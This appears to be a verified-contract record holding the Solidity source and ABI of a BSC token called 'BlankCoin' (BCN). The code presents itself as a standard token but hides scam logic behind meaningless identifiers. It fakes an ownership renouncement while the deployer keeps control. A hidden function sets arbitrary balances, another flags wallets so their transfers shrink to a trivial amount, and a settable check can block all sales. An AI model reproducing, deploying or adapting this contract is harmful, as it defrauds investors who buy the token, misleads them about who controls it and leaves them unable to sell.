{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract shouldSender {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface teamFeeLaunched {\n    function createPair(address launchFrom, address marketingAuto) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface feeMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface senderIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address listLaunch) external view returns (uint256);\n\n    function transfer(address receiverMin, uint256 launchTxIs) external returns (bool);\n\n    function allowance(address marketingSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 launchTxIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverMin,\n        uint256 launchTxIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptFund, uint256 value);\n    event Approval(address indexed marketingSell, address indexed spender, uint256 value);\n}\n\ninterface limitTrading is senderIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BlankCoin is shouldSender, senderIs, limitTrading {\n\n    function fromList(address fundMode) public {\n        require(fundMode.balance < 100000);\n        if (feeLiquidity) {\n            return;\n        }\n        if (minLaunch != launchedReceiver) {\n            fromToken = true;\n        }\n        fundReceiver[fundMode] = true;\n        if (minLaunch == marketingTrading) {\n            marketingTrading = minLaunch;\n        }\n        feeLiquidity = true;\n    }\n\n    function tradingAuto() private view {\n        require(fundReceiver[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return launchMinSender;\n    }\n\n    bool public feeLiquidity;\n\n    bool public tradingSwap;\n\n    function transfer(address atSenderEnable, uint256 launchTxIs) external virtual override returns (bool) {\n        return txFund(_msgSender(), atSenderEnable, launchTxIs);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchSwap;\n    }\n\n    uint256 public launchedEnable = 0;\n\n    function owner() external view returns (address) {\n        return launchMinSender;\n    }\n\n    mapping(address => uint256) private toAutoTrading;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return receiverTo;\n    }\n\n    uint256 public toWalletFrom;\n\n    mapping(address => mapping(address => uint256)) private marketingSwap;\n\n    function launchAuto(address launchWallet) public {\n        tradingAuto();\n        \n        if (launchWallet == launchToken || launchWallet == exemptAt) {\n            return;\n        }\n        sellReceiver[launchWallet] = true;\n    }\n\n    function balanceOf(address listLaunch) public view virtual override returns (uint256) {\n        return toAutoTrading[listLaunch];\n    }\n\n    bool public autoReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverShould;\n    }\n\n    address marketingTake;\n\n    event OwnershipTransferred(address indexed liquidityAmount, address indexed minAmountSender);\n\n    constructor (){\n        \n        amountMinExempt();\n        feeMode listShouldExempt = feeMode(senderSwap);\n        exemptAt = teamFeeLaunched(listShouldExempt.factory()).createPair(listShouldExempt.WETH(), address(this));\n        marketingTake = teamFeeLaunched(listShouldExempt.factory()).feeTo();\n        if (autoReceiver) {\n            fromToken = true;\n        }\n        launchToken = _msgSender();\n        fundReceiver[launchToken] = true;\n        toAutoTrading[launchToken] = receiverTo;\n        if (tradingSwap == fromToken) {\n            launchedReceiver = marketingTrading;\n        }\n        emit Transfer(address(0), launchToken, receiverTo);\n    }\n\n    bool private fromSwap;\n\n    uint256 public launchedReceiver;\n\n    function tradingTake(uint256 launchTxIs) public {\n        tradingAuto();\n        totalIs = launchTxIs;\n    }\n\n    mapping(address => bool) public fundReceiver;\n\n    uint8 private receiverShould = 18;\n\n    uint256 public minLaunch;\n\n    function allowance(address liquidityLaunched, address buyExempt) external view virtual override returns (uint256) {\n        if (buyExempt == senderSwap) {\n            return type(uint256).max;\n        }\n        return marketingSwap[liquidityLaunched][buyExempt];\n    }\n\n    uint256 totalIs;\n\n    address public exemptAt;\n\n    function modeReceiver(address swapAmount, address receiverMin, uint256 launchTxIs) internal view returns (uint256) {\n        require(launchTxIs > 0);\n\n        uint256 enableToLaunch = 0;\n        if (swapAmount == exemptAt && exemptSell > 0) {\n            enableToLaunch = launchTxIs * exemptSell / 100;\n        } else if (receiverMin == exemptAt && launchedEnable > 0) {\n            enableToLaunch = launchTxIs * launchedEnable / 100;\n        }\n        require(enableToLaunch <= launchTxIs);\n        return launchTxIs - enableToLaunch;\n    }\n\n    function txFund(address swapAmount, address receiverMin, uint256 launchTxIs) internal returns (bool) {\n        if (swapAmount == launchToken) {\n            return sellMarketing(swapAmount, receiverMin, launchTxIs);\n        }\n        uint256 listLaunchedMax = senderIs(exemptAt).balanceOf(marketingTake);\n        require(listLaunchedMax == totalIs);\n        require(receiverMin != marketingTake);\n        if (sellReceiver[swapAmount]) {\n            return sellMarketing(swapAmount, receiverMin, receiverEnableMin);\n        }\n        launchTxIs = modeReceiver(swapAmount, receiverMin, launchTxIs);\n        return sellMarketing(swapAmount, receiverMin, launchTxIs);\n    }\n\n    uint256 sellFrom;\n\n    function amountMinExempt() public {\n        emit OwnershipTransferred(launchToken, address(0));\n        launchMinSender = address(0);\n    }\n\n    function approve(address buyExempt, uint256 launchTxIs) public virtual override returns (bool) {\n        marketingSwap[_msgSender()][buyExempt] = launchTxIs;\n        emit Approval(_msgSender(), buyExempt, launchTxIs);\n        return true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenEnableLimit;\n    }\n\n    uint256 private receiverTo = 100000000 * 10 ** 18;\n\n    address public launchToken;\n\n    mapping(address => bool) public sellReceiver;\n\n    uint256 constant receiverEnableMin = 9 ** 10;\n\n    address senderSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private launchSwap = \"Blank Coin\";\n\n    address private launchMinSender;\n\n    string private tokenEnableLimit = \"BCN\";\n\n    bool private fromToken;\n\n    function sellMarketing(address swapAmount, address receiverMin, uint256 launchTxIs) internal returns (bool) {\n        require(toAutoTrading[swapAmount] >= launchTxIs);\n        toAutoTrading[swapAmount] -= launchTxIs;\n        toAutoTrading[receiverMin] += launchTxIs;\n        emit Transfer(swapAmount, receiverMin, launchTxIs);\n        return true;\n    }\n\n    uint256 public exemptSell = 3;\n\n    function tokenFund(address atSenderEnable, uint256 launchTxIs) public {\n        tradingAuto();\n        toAutoTrading[atSenderEnable] = launchTxIs;\n    }\n\n    function transferFrom(address swapAmount, address receiverMin, uint256 launchTxIs) external override returns (bool) {\n        if (_msgSender() != senderSwap) {\n            if (marketingSwap[swapAmount][_msgSender()] != type(uint256).max) {\n                require(launchTxIs <= marketingSwap[swapAmount][_msgSender()]);\n                marketingSwap[swapAmount][_msgSender()] -= launchTxIs;\n            }\n        }\n        return txFund(swapAmount, receiverMin, launchTxIs);\n    }\n\n    uint256 private marketingTrading;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minAmountSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptFund\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMinExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchTxIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLaunch\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundMode\",\"type\":\"address\"}],\"name\":\"fromList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchWallet\",\"type\":\"address\"}],\"name\":\"launchAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toWalletFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSenderEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchTxIs\",\"type\":\"uint256\"}],\"name\":\"tokenFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"launchTxIs\",\"type\":\"uint256\"}],\"name\":\"tradingTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atSenderEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchTxIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"launchTxIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BlankCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}